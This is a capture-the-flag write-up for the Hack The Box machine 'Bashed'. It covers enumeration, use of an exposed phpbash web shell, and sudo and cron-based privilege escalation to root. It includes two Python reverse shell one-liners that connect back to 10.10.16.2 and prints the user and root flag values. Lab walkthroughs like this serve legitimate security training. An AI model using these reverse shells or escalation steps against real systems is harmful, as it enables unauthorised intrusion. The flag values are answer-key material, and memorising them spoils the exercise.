# HTB: Bashed

## Engagement Overview
**Target:** HTB – Bashed  
**Box IP:** 10.10.10.68
**Date:** 2025-07-06

---

### Objectives
- Enumerate open services and directories
- Gain initial foothold via exposed web shell
- Escalate to user and root
- Capture user and root flags

---

## Service Enumeration

```
nmap -sC -sV -oN nmap.txt 10.10.10.68
```

- Port 80 open – Apache httpd 2.4.18 (Ubuntu)
- Web page title: *Arrexel's Development Site*

**Directory Enumeration (Dirbuster):**
- `/dev/phpbash.min.php`
- `/dev/phpbash.php`
- `/uploads/`

---

## Initial Access

Accessing the exposed shell at:

```
http://10.10.10.68/dev/phpbash.php
```

Confirms web shell as `www-data`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell Upgrade

```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.2",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

Upgraded with:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

`www-data` has `sudo` access to run commands as `scriptmanager` without password:

```
(ALL : ALL) NOPASSWD: ALL
```

Switched to `scriptmanager`, discovered `/scripts/` directory is writable and contains:

```
-rw-r--r-- 1 scriptmanager scriptmanager   test.py
-rw-r--r-- 1 root          root            test.txt
```

Noted `test.txt` is regularly overwritten — likely a root cron job running `test.py`.

### Gained Root Shell via Cron Execution

Overwrote `test.py` with a reverse shell payload:

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.16.2",1337));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Caught root shell via netcat listener.

---

## Post-Exploitation

**Flags:**
- `user.txt`: `501893517418a7460a6f616a86f3fd82`
- `root.txt`: `25a9eb38a763d8a0f04af9a3fc390ee7`

---

## Tools Utilized

- `nmap`
- `dirbuster`
- Python reverse shell
- `linuxprivchecker`
- `/dev/phpbash.php` interactive shell

References:
- https://github.com/sleventyeleven/linuxprivchecker
- https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2

---

## Key Takeaways

- Early enumeration can reveal dangerous dev artifacts like `phpbash.php` — always check `/dev/`, `/test/`, and `/uploads/`
- Reverse shells can be stabilized and upgraded quickly using Python and TTY tricks — important for chaining escalation steps
- Cron jobs running scripts owned or writable by non-root users are a goldmine for privesc
- Use of `sudo` without a password by secondary users (like `scriptmanager`) can be leveraged even without direct root access